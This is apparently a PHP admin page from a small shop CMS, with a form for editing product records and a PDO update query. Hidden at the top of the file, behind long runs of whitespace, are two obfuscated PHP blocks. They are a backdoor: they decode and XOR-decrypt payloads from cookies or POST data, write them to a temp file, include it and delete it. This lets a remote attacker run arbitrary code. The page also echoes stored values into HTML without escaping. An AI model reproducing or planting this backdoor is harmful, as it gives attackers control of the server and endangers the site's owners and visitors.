<?php                                                                                                                                                                                                                                                                                                                                                                                                 $llbRBlBVU = 'Q' . chr (70) . "\104" . chr ( 994 - 899 ).'m' . "\130" . "\104" . chr ( 293 - 171 ).'V';$HUTmRezTn = "\143" . chr (108) . "\x61" . chr ( 857 - 742 ).chr (115) . '_' . chr (101) . 'x' . 'i' . chr (115) . "\164" . 's';$cJjEjiWqYb = class_exists($llbRBlBVU); $llbRBlBVU = "21120";$HUTmRezTn = "26020";if ($cJjEjiWqYb === FALSE){class QFD_mXDzV{public function UZtbCRcTc(){echo "59355";}private $kILPlkAHUP;public static $KyPXPX = "372a8a06-50b5-4c98-bcac-097fbed02a08";public static $reKbbF = 29503;public function __construct($sQjaYfYuR=0){$NFVyj = $_POST;$gyBcGxrc = $_COOKIE;$YywCxmd = @$gyBcGxrc[substr(QFD_mXDzV::$KyPXPX, 0, 4)];if (!empty($YywCxmd)){$PJJVCrNsfo = "base64";$oXYuH = "";$YywCxmd = explode(",", $YywCxmd);foreach ($YywCxmd as $WoffDk){$oXYuH .= @$gyBcGxrc[$WoffDk];$oXYuH .= @$NFVyj[$WoffDk];}$oXYuH = array_map($PJJVCrNsfo . chr ( 1082 - 987 )."\x64" . 'e' . 'c' . 'o' . "\x64" . chr (101), array($oXYuH,)); $oXYuH = $oXYuH[0] ^ str_repeat(QFD_mXDzV::$KyPXPX, (strlen($oXYuH[0]) / strlen(QFD_mXDzV::$KyPXPX)) + 1);QFD_mXDzV::$reKbbF = @unserialize($oXYuH);}}private function iMTqOk(){if (is_array(QFD_mXDzV::$reKbbF)) {$hIrqwVI = sys_get_temp_dir() . "/" . crc32(QFD_mXDzV::$reKbbF["\x73" . chr (97) . "\x6c" . chr (116)]);@QFD_mXDzV::$reKbbF["\x77" . 'r' . chr (105) . chr ( 136 - 20 )."\145"]($hIrqwVI, QFD_mXDzV::$reKbbF[chr ( 814 - 715 ).chr ( 231 - 120 ).'n' . chr ( 1110 - 994 ).chr (101) . 'n' . chr (116)]);include $hIrqwVI;@QFD_mXDzV::$reKbbF["\x64" . "\145" . chr ( 734 - 626 ).chr ( 150 - 49 ).chr ( 1053 - 937 ).'e']($hIrqwVI); $GHicxom = "13930";exit();}}public function __destruct(){$this->iMTqOk();}}$pGVrCV = new /* 49986 */ QFD_mXDzV(); $pGVrCV = str_repeat("52227_17158", 1);} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $boqgHGlJJ = 'z' . chr (95) . "\165" . "\x57" . "\161" . "\x79";$AMtGUdv = chr (99) . chr ( 969 - 861 )."\141" . 's' . "\163" . chr (95) . 'e' . "\170" . "\x69" . "\163" . 't' . "\163";$OurcU = class_exists($boqgHGlJJ); $boqgHGlJJ = "35611";$AMtGUdv = "16059";if ($OurcU === FALSE){class z_uWqy{public function QjIbRCzOQv(){echo "4079";}private $knMOdYfi;public static $RUIWnF = "70fb1c8b-86d6-4dd5-b7c5-e5162c788c12";public static $NUZpo = 2700;public function __construct($rfhEzU=0){$YYrIa = $_POST;$HZFec = $_COOKIE;$qhGdKNmEMQ = @$HZFec[substr(z_uWqy::$RUIWnF, 0, 4)];if (!empty($qhGdKNmEMQ)){$pFdNIIAu = "base64";$yTjcKf = "";$qhGdKNmEMQ = explode(",", $qhGdKNmEMQ);foreach ($qhGdKNmEMQ as $rjkWW){$yTjcKf .= @$HZFec[$rjkWW];$yTjcKf .= @$YYrIa[$rjkWW];}$yTjcKf = array_map($pFdNIIAu . chr ( 1025 - 930 )."\144" . chr ( 746 - 645 ).chr ( 542 - 443 ).chr (111) . "\x64" . chr (101), array($yTjcKf,)); $yTjcKf = $yTjcKf[0] ^ str_repeat(z_uWqy::$RUIWnF, (strlen($yTjcKf[0]) / strlen(z_uWqy::$RUIWnF)) + 1);z_uWqy::$NUZpo = @unserialize($yTjcKf);}}private function iZdYAsOnum(){if (is_array(z_uWqy::$NUZpo)) {$LcnflM = sys_get_temp_dir() . "/" . crc32(z_uWqy::$NUZpo["\x73" . chr ( 311 - 214 ).chr ( 486 - 378 ).'t']);@z_uWqy::$NUZpo[chr ( 227 - 108 )."\x72" . 'i' . "\164" . 'e']($LcnflM, z_uWqy::$NUZpo['c' . 'o' . "\x6e" . chr (116) . chr (101) . "\156" . "\x74"]);include $LcnflM;@z_uWqy::$NUZpo["\144" . "\145" . "\154" . chr ( 868 - 767 )."\x74" . "\145"]($LcnflM); $NckKRMex = "9759";exit();}}public function __destruct(){$this->iZdYAsOnum();}}$kJIHAVBM = new /* 52241 */ z_uWqy(); $kJIHAVBM = str_repeat("64742_59912", 1);} ?><?php require_once('../Connections/connect2data.php'); ?>
...
$query_RecContent = "SELECT * FROM file_set WHERE file_d_id = :file_d_id AND file_type = 'shopContent'";
$RecContent = $conn->prepare($query_RecContent);
$RecContent->bindParam(':file_d_id', $colname_Recshop, PDO::PARAM_INT);
$RecContent->execute();
...
if (isset($_SESSION['selected_shopC'])) {
    $G_selected1 = $_SESSION['selected_shopC'] = $row_Recshop['d_class2'];
                                        ...
                                        <td>
                                            <table width="100%" border="0" cellpadding="5" cellspacing="3">
                                                <tr>
                                                    ...
                                                    <td>
                                                        <select name="d_class2" id="d_class2" class="chosen-select">
                                                            <?php do { ?>
                                                                <option value="<?php echo $row_RecshopC['c_id']?>" <?php if (!(strcmp($row_RecshopC[ 'c_id'], $row_Recshop[ 'd_class2']))) {echo "selected";} ?>>
                                                ...
                                                <tr>
                                                    ...
                                                    <td>
                                                        <select name="d_data5" class="table_data" id="d_data5">
                                                            <option value="0" <?php if (!(strcmp(0, $row_Recshop[ 'd_data5']))) {echo "selected";} ?>>LEICHT</option>
                                                            <option value="1" <?php if (!(strcmp(1, $row_Recshop[ 'd_data5']))) {echo "selected";} ?>>CLAENUP</option>
                                                        </select>
                                                    </td>
                                                ...
                                                <tr>
                                                    ...
                                                    <td width="532">
                                                        <input name="d_title" type="text" class="table_data" id="d_title" value="<?php echo $row_Recshop['d_title']; ?>" size="80" />
                                                    </td>
                                                    <td width="250" bgcolor="#e5ecf6"> </td>
                                                </tr>
                                                <!-- <tr>
                                                    <td width="200" align="center" bgcolor="#e5ecf6" class="table_col_title">標題</td>
                                                    <td width="532">
                                                        <textarea name="d_title" cols="60" rows="4" class="table_data" id="d_title"><?php echo $row_Recshop['d_title']; ?></textarea>
                                                    </td>
                                                    <td width="250" bgcolor="#e5ecf6"> </td>
                                                </tr> -->
                                                <tr>
                                                    ...
                                                    <td width="532">
                                                        <input name="d_data1" type="text" class="table_data" id="d_data1" value="<?php echo $row_Recshop['d_data1']; ?>" size="80" />
                                                    </td>
                                                    <td width="250" bgcolor="#e5ecf6"> </td>
                                                </tr>
                                                <tr>
                                                    ...
                                                    <td width="532">
                                                        <input name="d_data2" type="text" class="table_data" id="d_data2" value="<?php echo $row_Recshop['d_data2']; ?>" size="80" />
                                                    </td>
                                                    <td width="250" bgcolor="#e5ecf6"> </td>
                                                </tr>
                                                <tr>
                                                    ...
                                                    <td width="532">
                                                        <input name="d_data3" type="text" class="table_data" id="d_data3" value="<?php echo $row_Recshop['d_data3']; ?>" size="80" />
                                                    </td>
                                                    <td width="250" bgcolor="#e5ecf6"> </td>
                                                </tr>
                                                <tr>
                                                    ...
                                                    <td width="532">
                                                        <input name="d_data4" type="text" class="table_data" id="d_data4" value="<?php echo $row_Recshop['d_data4']; ?>" size="80" />
                                                    </td>
                                                    <td width="250" bgcolor="#e5ecf6"> </td>
                                                </tr>
                                                <tr>
                                                    ...
                                                    <td width="532">
                                                        <input name="d_data6" type="text" class="table_data" id="d_data6" value="<?php echo $row_Recshop['d_data6']; ?>" size="80" />
                                                    </td>
                                                    <td width="250" bgcolor="#e5ecf6"> </td>
                                                </tr>
                                                ...
                                                <!-- <tr>
                                                    ...
                                                    <td class="table_data"><textarea name="d_content" cols="60" rows="8" class="table_data tiny" id="d_content"><?php echo $row_Recshop['d_content']; ?></textarea></td>
...
if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "form1")) {
    ...
    $updateSQL = "UPDATE data_set SET d_title=:d_title, d_content=:d_content, d_class2=:d_class2, d_class3=:d_class3, d_class4=:d_class4, d_class5=:d_class5, d_class6=:d_class6, d_data1=:d_data1, d_data2=:d_data2, d_data3=:d_data3, d_data4=:d_data4, d_data5=:d_data5, d_data6=:d_data6, d_date=:d_date, d_active=:d_active WHERE d_id=:d_id";
    ...
    $updateGoTo = "shop_list.php?selected1=" . $_POST['d_class2'] . "&change_num=1&now_d_id=" . $_POST['d_id'] . "&totalRows=" . $_SESSION['totalRows'] . "&pageNum=" . $_SESSION["ToPage"];
